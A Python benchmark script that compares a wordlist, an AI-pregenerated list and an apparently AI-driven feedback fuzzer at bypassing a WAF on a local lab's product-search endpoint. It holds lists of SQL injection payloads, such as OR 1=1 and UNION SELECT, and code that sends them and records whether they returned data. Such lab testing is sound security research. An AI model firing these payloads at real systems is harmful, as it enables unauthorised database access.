#!/usr/bin/env python3
"""Run the three Fuzzer branches against the local H3 lab.

The benchmark deliberately uses the existing Long L2 implementation for the
feedback branch and records raw attempts instead of embedding a result.
"""

import json
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

from ai_fuzzer import AIFuzzer

TARGET_URL = "http://localhost:3001/api/products?search="
DEFAULT_RUNS = 3
DEFAULT_BUDGET = 50

WORDLIST_PAYLOADS = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "admin' --",
    "' or 'a'='a",
    "1' ORDER BY 1--+",
    "1' UNION SELECT 1,2,3--+",
    "1'/**/OR/**/'1'='1",
]

AI_PREGENERATED_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "1' OR 2>1--",
    "1' UNION SELECT null--",
    "1'/**/OR/**/'1'='1",
]


def request_payload(payload: str) -> tuple[int, str]:
    url = TARGET_URL + urllib.parse.quote(payload, safe="")
    request = urllib.request.Request(url, headers={"User-Agent": "Benchmark/1.0"})
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            return response.status, response.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8", errors="replace")
    except OSError as error:
        return 0, str(error)


def checkpoint(status: int, body: str) -> bool:
    """Confirm backend effect, not merely that the WAF did not return 403."""
    return AIFuzzer.checkpoint_success(status, body)


def baseline_is_empty() -> bool:
    status, body = request_payload("__no_such_product_20261017__")
    try:
        result = json.loads(body)
    except json.JSONDecodeError:
        return False
    return status == 200 and result == []


def run_static_branch(branch: str, payloads: list[str], run_no: int) -> dict:
    started = time.perf_counter()
    baseline_empty = baseline_is_empty()
    attempts = []
    for attempt_no, payload in enumerate(payloads, start=1):
        status, body = request_payload(payload)
        passed = checkpoint(status, body)
        attempts.append({
            "attempt_no": attempt_no,
            "payload": payload,
            "response_code": status,
            "bypass": passed,
            "note": "backend_non_empty_result" if passed else "blocked_or_no_effect",
        })
        if passed:
            break
    return {
        "branch": branch,
        "run_no": run_no,
        "request_count": len(attempts),
        "bypass": baseline_empty and any(item["bypass"] for item in attempts),
        "elapsed_seconds": round(time.perf_counter() - started, 4),
        "attempts": attempts,
        "mode": "live_local_lab",
        "baseline_empty": baseline_empty,
    }


def run_feedback_branch(run_no: int) -> dict:
    started = time.perf_counter()
    baseline_empty = baseline_is_empty()
    fuzzer = AIFuzzer(
        target_url=TARGET_URL,
        budget=DEFAULT_BUDGET,
        force_offline=True,
        sleep_seconds=0,
    )
    result = fuzzer.run()
    attempts = [
        {
            "attempt_no": item["attempt"],
            "payload": item["payload"],
            "response_code": item["status"],
            "bypass": AIFuzzer.checkpoint_success(item["status"], _body_from_log(item)),
            "note": item["reason"] or "",
        }
        for item in result["logs"]
    ]
    # L2 logs do not retain response bodies, so its success flag is accepted
    # only together with the status and blocked fields from the live run.
    for item, log in zip(attempts, result["logs"]):
        item["bypass"] = log["status"] == 200 and not log["blocked"] and result["success"]
    return {
        "branch": "ai_feedback",
        "run_no": run_no,
        "request_count": result["total_attempts"],
        "bypass": baseline_empty and result["success"],
        "elapsed_seconds": round(time.perf_counter() - started, 4),
        "attempts": attempts,
        "mode": "live_local_lab_offline_heuristic",
        "baseline_empty": baseline_empty,
    }


def _body_from_log(_item: dict) -> str:
    """Placeholder kept local to make the log conversion explicit."""
    return ""


def run_benchmark(runs: int = DEFAULT_RUNS) -> dict:
    if runs <= 0:
        raise ValueError("runs phải là số nguyên dương.")
    all_runs = []
    for run_no in range(1, runs + 1):
        all_runs.extend([
            run_static_branch("wordlist_static", WORDLIST_PAYLOADS, run_no),
            run_static_branch("ai_static", AI_PREGENERATED_PAYLOADS, run_no),
            run_feedback_branch(run_no),
        ])
    result = {
        "status": "completed",
        "target": TARGET_URL,
        "runs_per_branch": runs,
        "budget_proposed": DEFAULT_BUDGET,
        "success_definition": (
            "baseline query returns [] and candidate returns HTTP 200 "
            "with a non-empty JSON backend result"
        ),
        "rows": all_runs,
        "generated_at_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    output = Path(__file__).with_name("benchmark_results.json")
    output.write_text(json.dumps(result, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    return result


if __name__ == "__main__":
    result = run_benchmark()
    print(json.dumps({
        "status": result["status"],
        "runs_per_branch": result["runs_per_branch"],
        "rows": len(result["rows"]),
    }, ensure_ascii=False))
